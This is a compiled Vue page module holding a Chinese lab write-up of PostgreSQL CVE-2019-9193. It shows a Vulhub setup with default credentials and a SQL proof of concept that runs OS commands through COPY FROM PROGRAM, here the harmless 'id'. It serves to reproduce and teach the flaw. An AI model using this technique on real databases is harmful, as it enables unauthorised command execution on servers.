import{_ as n}from"./plugin-vue_export-helper-c27b6911.js";import{r as t,o,c,a as e,b as s,d as r,e as d}from"./app-58e4a7d6.js";const i={},l=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),s(" 漏洞描述")],-1),p=e("p",null,"PostgreSQL 是一款关系型数据库。其9.3到11版本中存在一处“特性”，管理员或具有“COPY TO/FROM PROGRAM”权限的用户，可以使用这个特性执行任意命令。",-1),u=e("p",null,"参考链接：",-1),m={href:"https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5",target:"_blank",rel:"noopener noreferrer"},_=d(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub启动存在漏洞的环境：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker-compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>环境启动后，将开启Postgres默认的5432端口，默认账号密码为postgres/postgres。</p><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>连接数据库：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>psql --host your-ip --username postgres
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>首先连接到postgres中，并执行参考链接中的POC：</p><div class="language-sql line-numbers-mode" data-ext="sql"><pre class="language-sql"><code><span class="token keyword">DROP</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token keyword">EXISTS</span> cmd_exec<span class="token punctuation">;</span>
<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> cmd_exec<span class="token punctuation">(</span>cmd_output <span class="token keyword">text</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
COPY cmd_exec <span class="token keyword">FROM</span> PROGRAM <span class="token string">&#39;id&#39;</span><span class="token punctuation">;</span>
<span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> cmd_exec<span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>FROM PROGRAM</code>语句将执行命令id并将结果保存在cmd_exec表中：</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202281443076.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,11);function h(k,g){const a=t("ExternalLinkIcon");return o(),c("div",null,[l,p,u,e("ul",null,[e("li",null,[e("a",m,[s("https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5"),r(a)])])]),_])}const b=n(i,[["render",h],["__file","PostgreSQL 高权限命令执行漏洞 CVE-2019-9193.html.vue"]]);export{b as default};
